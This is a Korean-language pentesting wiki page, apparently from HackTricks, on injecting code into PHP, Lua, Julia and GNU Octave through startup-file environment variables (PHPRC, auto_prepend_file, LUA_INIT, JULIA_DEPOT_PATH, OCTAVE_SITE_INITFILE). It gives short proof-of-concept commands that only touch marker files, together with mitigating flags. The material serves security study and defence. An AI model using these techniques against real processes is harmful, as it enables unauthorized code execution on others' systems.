# macOS Interpreter 시작 파일 Injection

{{#include ../../../banners/hacktricks-training.md}}

이러한 런타임별 기법은 상속된 환경 변수를 사용해 의도된 스크립트보다 먼저 시작 구성을 선택하거나 코드를 실행합니다. Lua는 인라인 코드 방식도 지원합니다.

## PHP 시작 구성

### `PHPRC` / `PHP_INI_SCAN_DIR` 및 `auto_prepend_file`

PHP CLI와 CGI는 실행될 때마다 구성을 읽습니다. `PHPRC`를 사용하면 공격자가 읽을 수 있는 `php.ini`를 지정할 수 있고, `PHP_INI_SCAN_DIR`을 사용하면 추가 `.ini` 파일을 검색하는 디렉터리를 다른 곳으로 지정할 수 있습니다. `auto_prepend_file` 지시어는 요청된 스크립트보다 먼저 PHP가 파일을 파싱하도록 하므로, 이 조합으로 시작 시 코드를 실행할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

대안으로는 `.ini` 파일이 포함된 디렉터리를 사용할 수 있습니다:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` 옵션은 `php.ini`를 무시하며, 명시적으로 지정한 신뢰할 수 있는 `-c` 경로가 `PHPRC`보다 우선합니다. 장시간 실행되는 서버 SAPI는 일반적으로 웹 서버가 시작될 때 설정을 읽는 반면, CLI와 CGI는 실행할 때마다 설정을 읽습니다.<sup>[[1]](#references)</sup>

## Lua 시작 코드

### `LUA_INIT`

명령줄 옵션이나 대상 스크립트를 처리하기 전에 독립형 Lua 인터프리터는 `LUA_INIT_<major>_<minor>`를 실행하거나, 버전 지정 변수가 없으면 `LUA_INIT`을 실행합니다. 값이 `@`로 시작하면 파일을 지정하며, 그 외의 값은 Lua 코드로 직접 평가됩니다. 따라서 파일을 사용하는 방식과 파일 없이 시작 시 코드를 실행하는 방식 모두 가능합니다.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

인터프리터에 따라 정확한 버전 지정 이름이 달라집니다. 예를 들어 `LUA_INIT_5_4`입니다. `lua -E`는 시작 코드와 Lua 모듈 경로를 포함한 모든 환경 변수를 무시합니다.

## Julia 시작 depot

### `JULIA_DEPOT_PATH` 및 `startup.jl`

Julia는 일반적으로 시작 시 첫 번째 depot의 `config/startup.jl`을 실행합니다. `JULIA_DEPOT_PATH`는 depot 목록을 제어하므로, 공격자가 읽을 수 있는 트리를 지정하면 자동으로 로드되는 시작 파일을 다른 파일로 바꿀 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

마지막 구분자는 피해자가 기본 패키지를 계속 사용해야 할 때 유용합니다. `julia --startup-file=no`는 이 startup file을 비활성화합니다. 이 변수는 패키지 레지스트리, 환경, 캐시, 코드 로딩 위치도 제어하므로 실행 전에 변수를 지우세요.

## GNU Octave startup files

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave는 시작 중 유효한 Octave 명령이 포함된 여러 파일을 실행합니다. `OCTAVE_SITE_INITFILE`은 사이트 전체 startup file을 재정의하고, `OCTAVE_VERSION_INITFILE`은 버전별 startup file을 재정의하므로 어느 변수든 자동 실행을 공격자가 읽을 수 있는 파일로 리디렉션할 수 있습니다.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file`은 `~/.octaverc` 같은 사용자 파일만 건너뛰며, 위의 site-file 재정의는 막지 않습니다. site 파일에는 `--no-site-file`을 사용하거나, 모든 시작 파일을 비활성화하려면 `--norc` / `-f`를 사용하세요.<sup>[[7]](#references)</sup>

## References

- [1] [PHP 설정 파일](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 독립 실행형 인터프리터](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia 명령줄 인터페이스: 시작 파일](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia 환경 변수: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave 시작 파일](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave 명령줄 옵션](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
